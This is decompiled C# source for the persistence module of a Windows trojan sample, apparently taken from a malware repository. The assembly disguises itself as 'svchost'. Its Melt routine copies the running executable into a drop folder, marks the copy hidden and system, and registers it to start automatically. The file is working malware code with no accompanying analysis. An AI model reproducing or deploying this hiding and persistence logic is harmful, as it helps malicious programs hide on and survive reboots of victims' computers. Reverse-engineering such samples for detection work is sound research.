// Decompiled with JetBrains decompiler
// Type: svchost.Persistence.Stealth_Mode
// Assembly: svchost, Version=10.0.18362.1, Culture=neutral, PublicKeyToken=null
// MVID: 64EF29CB-BBE3-43C5-8FBF-9660E67757C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-b33d569af5e490875d6473c6402797ddb4ce639bb1f1cf7f67698eeafa625f09.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Windows.Forms;

namespace svchost.Persistence
{
  [OptionText]
  public class Stealth_Mode
  {
    public string DropPath;
    public string InstallName;
    public string StartName;

    public Stealth_Mode(string droPath, string insName, string StartupName)
    {
      this.DropPath = droPath;
      this.InstallName = insName;
      this.StartName = StartupName;
    }

    public object Install_Server()
    {
      object obj;
      try
      {
        if (!Directory.Exists(this.DropPath))
          Directory.CreateDirectory(this.DropPath);
        if (File.Exists(Path.Combine(this.DropPath, this.InstallName)))
          File.Delete(Path.Combine(this.DropPath, this.InstallName));
        this.Melt(Path.Combine(this.DropPath, this.InstallName));
        obj = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public object Melt(string filename)
    {
      object obj;
      try
      {
        File.Copy(Application.ExecutablePath, filename, true);
        File.SetAttributes(filename, FileAttributes.Hidden | FileAttributes.System);
        Startup.AStartup(this.StartName, filename);
        obj = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }
  }
}
